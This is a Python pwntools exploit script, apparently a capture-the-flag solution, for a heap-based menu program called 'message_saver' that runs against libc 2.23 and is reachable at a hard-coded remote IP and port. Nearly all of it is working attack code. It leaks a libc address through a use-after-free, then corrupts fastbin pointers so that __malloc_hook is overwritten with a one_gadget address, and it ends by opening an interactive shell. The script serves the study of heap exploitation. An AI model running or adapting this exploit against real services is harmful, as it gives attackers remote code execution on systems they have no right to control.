#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

BINARY = './message_saver'
HOST, PORT = '35.226.111.216', 4444

elf = ELF(BINARY)
libc = ELF('./libc-2.23.so')

def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = ""
    PIE = get_base_address(p)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)

def add(idx, topic, body):
    p.sendlineafter('>>', '1')
    p.sendlineafter('index\n', str(idx))
    p.sendlineafter('topic\n', topic)
    p.sendlineafter('body\n', str(len(body)+2)) # +2 due to application logic stuff
    p.sendlineafter('body\n', body)

def edit(idx, topic, body):
    p.sendlineafter('>>', '2')
    p.sendlineafter('index\n', str(idx))
    p.sendlineafter('topic\n', topic)
    p.sendlineafter('body\n', body)

def free(idx):
    p.sendlineafter('>>', '3')
    p.sendlineafter('index\n', str(idx))

def show(idx):
    p.sendlineafter('>>', '4')
    p.sendlineafter('index\n', str(idx))

    content = p.recvuntil('Message viewing')

    return content


def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

p = start()
if not args.REMOTE and args.GDB:
    debug([])

# Exploit goes here

# Set up initial chunks
add(0, 'A'*0x8, 'A'*0x80) # Small sized chunk, goes into unsorted bin for libc leak
add(1, 'B'*0x8, 'B'*0x66) # Used for fastbin attack
add(2, 'C'*0x8, 'C'*0x66) # Used for fastbin attack
add(3, 'D'*0x8, 'D'*0x50) # Prevents coalesce with the top chunk

# Free the small sized chunk and use the UAF to read the libc address from it
free(0)
leak = u64(show(0).split('\n')[1].split(' : ')[1].ljust(8, '\x00'))

# Calculate offsets
libc.address = leak - 0x3c4b78
malloc_hook = libc.symbols['__malloc_hook'] - 0x30 + 0xd
one_gadget = libc.address + 0xf02a4

log.info('Libc leak: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))
log.info('__malloc_hook: ' + hex(malloc_hook))
log.info('one_gadget: ' + hex(one_gadget))

# Fastbin attack time. Free 1 and 2
free(1)
free(2)

# We must have a valid pointer at the fd of the topic chunk, otherwise the program will crash
# So we initially read the fd pointer and store it
topic_fd = u64(show(2).split('\n')[0].split(' : ')[1].ljust(8, '\x00'))

# Now overwrite the fd pointer of 2's description to __malloc_hook-0x30+0xd
edit(2, p64(topic_fd), p64(malloc_hook))

# Second allocation will be at __malloc_hook-0x30+0xd
# Overwrite __malloc_hook with one_gadget
add(4, 'E'*0x8, 'E'*0x66)
add(5, 'F'*0x8, 'F'*0x13 + p64(one_gadget) + 'F'*0x4b)

# Get shell
p.sendlineafter('>>', '1')
p.sendlineafter('index\n', '0')


p.interactive()
